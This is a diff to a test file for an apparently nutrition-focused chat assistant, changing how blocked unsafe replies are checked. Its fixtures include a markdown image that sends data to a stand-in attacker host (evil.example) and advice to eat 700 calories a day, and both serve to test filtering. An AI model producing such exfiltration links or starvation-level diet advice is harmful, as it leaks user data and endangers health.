@@ -5,7 +5,7 @@ import { adminClient } from '../../../test/helpers/content';
 import { T0, body, jsonInit, linkAccount, makeApp, signUp } from '../../../test/helpers/app';
 import { newId } from '../../core/ids';
 import { DAY } from '../../core/time';
-import { CRISIS_REPLY, FALLBACK_REPLY, SCOPE_REPLY } from './safety';
+import { CRISIS_REPLY, FALLBACK_REPLY, REPLACEMENT, SCOPE_REPLY } from './safety';
 
 async function setup(ai = new FakeAi(), { linked = true } = {}) {
   const t = makeApp({ ai });
@@ -115,10 +115,9 @@ describe('Ask Pango', () => {
     ai.chatAnswer = 'See ![x](https://evil.example/?q=data) this [guide](https://evil.example) for oats.';
     expect((await body(await ask('Oats?'))).reply.content).toBe('See this guide for oats.');
     ai.chatAnswer = 'Just eat 700 calories a day for a month.';
-    expect((await body(await ask('Fastest way to lose 10 kg?'))).reply).toMatchObject({
-      kind: 'blocked',
-      content: FALLBACK_REPLY,
-    });
+    const low = (await body(await ask('Fastest way to lose 10 kg?'))).reply;
+    expect(low.kind).toBe('blocked');
+    expect(low.content).toBe(REPLACEMENT['below-calorie-floor']!(1200)); // still helpful, without the unsafe number
   });
 
   it('listens to the safety model on the way in and the way out', async () => {
